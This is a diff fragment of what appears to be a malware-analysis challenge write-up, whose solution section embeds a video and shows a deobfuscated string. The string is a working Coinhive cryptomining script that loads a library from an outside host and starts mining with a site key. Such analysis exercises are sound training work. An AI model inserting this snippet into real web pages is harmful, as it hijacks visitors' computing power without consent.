@@ -67,7 +67,7 @@ You are a malware analyst reviewing this application to determine if it's malwar
 ### Solution
 
 <iframe width="560" height="315" src="https://www.youtube.com/embed/HZMvCw9kHlI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
+<br/>
 The deobfuscated string is: 
 ```
 <script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
